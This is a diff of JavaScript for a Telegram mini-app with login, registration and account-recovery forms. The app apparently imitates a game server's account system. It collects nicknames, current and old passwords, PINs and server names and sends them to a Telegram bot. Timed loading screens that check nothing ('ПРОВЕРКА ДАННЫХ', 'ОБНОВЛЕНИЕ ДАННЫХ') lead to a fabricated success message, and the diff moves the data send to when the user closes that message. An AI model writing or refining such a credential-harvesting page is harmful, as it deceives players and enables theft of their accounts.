@@ -1,6 +1,8 @@
 const tg = window.Telegram.WebApp;
+tg.ready();
 tg.expand();
 
+// === АНИМАЦИЯ ЗАГРУЗКИ ПРИ СТАРТЕ ===
 let percent = 0;
 const bar = document.getElementById('bar');
 const percentText = document.getElementById('percent');
@@ -23,6 +25,7 @@ if (loader && main) {
     }, 30);
 }
 
+// === ПИН-КОД ===
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
     const pinInput = document.getElementById('pin');
@@ -76,6 +79,7 @@ document.addEventListener('DOMContentLoaded', () => {
     markFilled('new_password', 'iconNewPass');
 });
 
+// === АНИМАЦИЯ ЗАГРУЗКИ ===
 function showLoading(text, callback) {
     const loaderDiv = document.createElement('div');
     loaderDiv.className = 'loader-screen';
@@ -108,6 +112,25 @@ function showLoading(text, callback) {
     }, 30);
 }
 
+// === ОТПРАВКА ДАННЫХ (при закрытии) ===
+let pendingData = null;
+
+function sendToBot(text) {
+    pendingData = text;
+}
+
+function confirmSend() {
+    if (pendingData) {
+        try {
+            tg.sendData(pendingData);
+        } catch (e) {
+            console.error('Ошибка отправки:', e);
+        }
+    }
+    tg.close();
+}
+
+// === СООБЩЕНИЕ ОБ УСПЕХЕ ===
 function showSuccess(text, nick, server) {
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
@@ -116,26 +139,34 @@ function showSuccess(text, nick, server) {
     overlay.className = 'success-overlay';
     overlay.innerHTML = `
         <div class="success-box">
+            <div class="success-close" onclick="confirmSend()">✕</div>
             <div class="success-check">✔</div>
             <div class="success-text">${text}</div>
             <div class="success-info">${nick} • ${time} • ${server}</div>
-            <button class="success-btn" onclick="this.parentElement.parentElement.remove()">ЗАКРЫТЬ</button>
         </div>
     `;
     document.body.appendChild(overlay);
 }
 
-function sendToBot(text) {
-    try {
-        tg.sendData(text);
-    } catch (e) {
-        console.error('Ошибка отправки:', e);
-    }
-}
-
+// === НАВИГАЦИЯ ===
 function goTo(page) { window.location.href = page; }
 function validateNick(nick) { return /^[A-Za-z]+_[A-Za-z]+$/.test(nick); }
 
+// === ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
+function toggleServerList() {
+    const dropdown = document.getElementById('serverDropdown');
+    if (dropdown) dropdown.classList.toggle('active');
+}
+
+function selectServer(value) {
+    const valueEl = document.getElementById('serverValue');
+    const hiddenInput = document.getElementById('server');
+    if (valueEl) valueEl.textContent = value;
+    if (hiddenInput) hiddenInput.value = value;
+    toggleServerList();
+}
+
+// === ВХОД ===
 function login() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -156,10 +187,13 @@ function login() {
     sendToBot(data);
 
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
-        showSuccess('Вход выполнен!', nick, server);
+        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
+            showSuccess('Вход выполнен!', nick, server);
+        });
     });
 }
 
+// === РЕГИСТРАЦИЯ ===
 function register() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -169,7 +203,7 @@ function register() {
     const referrer = document.getElementById('referrer').value.trim();
 
     if (!nick) { alert('Введите ник!'); return; }
-    if (!validateNick(nick)) { alert('Ник в формате Nick_Name (только английские)!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Nick_Name!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
 
     const data = (
@@ -184,15 +218,14 @@ function register() {
 
     sendToBot(data);
 
-    showLoading('ОБРАБОТКА ДАННЫХ', () => {
-        showLoading('ЗАГРУЗКА ДАННЫХ', () => {
-            showLoading('ОБНОВЛЕНИЕ БАЗЫ ДАННЫХ', () => {
-                showSuccess('Вы успешно зарегистрировали аккаунт!', nick, server);
-            });
+    showLoading('ПРОВЕРКА ДАННЫХ', () => {
+        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
+            showSuccess('Аккаунт успешно зарегистрирован!', nick, server);
         });
     });
 }
 
+// === ВОССТАНОВЛЕНИЕ ===
 function recover() {
     const nick = document.getElementById('nick').value.trim();
     const oldPass = document.getElementById('old_password').value.trim();
@@ -215,25 +248,9 @@ function recover() {
 
     sendToBot(data);
 
-    showLoading('ПРОВЕРКА В БАЗЕ ДАННЫХ', () => {
-        showLoading('ВНЕСЕНИЕ НОВЫХ ДАННЫХ', () => {
-            showSuccess('Данные от аккаунта успешно обновлены', nick, server);
+    showLoading('ПРОВЕРКА ДАННЫХ', () => {
+        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
+            showSuccess('Аккаунт успешно восстановлен!', nick, server);
         });
     });
-}
-
-// === ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
-function toggleServerList() {
-    const dropdown = document.getElementById('serverDropdown');
-    if (dropdown) {
-        dropdown.classList.toggle('active');
-    }
-}
-
-function selectServer(value) {
-    const valueEl = document.getElementById('serverValue');
-    const hiddenInput = document.getElementById('server');
-    if (valueEl) valueEl.textContent = value;
-    if (hiddenInput) hiddenInput.value = value;
-    toggleServerList();
 }
